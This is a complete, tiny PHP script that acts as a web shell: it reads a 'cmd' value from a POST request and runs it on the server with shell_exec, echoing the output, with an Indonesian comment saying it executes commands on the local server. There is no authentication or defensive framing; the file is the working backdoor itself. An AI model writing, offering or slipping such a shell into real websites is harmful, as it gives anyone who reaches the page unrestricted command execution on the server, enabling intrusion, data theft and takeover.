<?php
if(isset($_POST['cmd'])){
    $command = $_POST['cmd'];
    echo "<pre>";
    echo shell_exec($command); // Eksekusi command di server lokal
    echo "</pre>";
}
?>
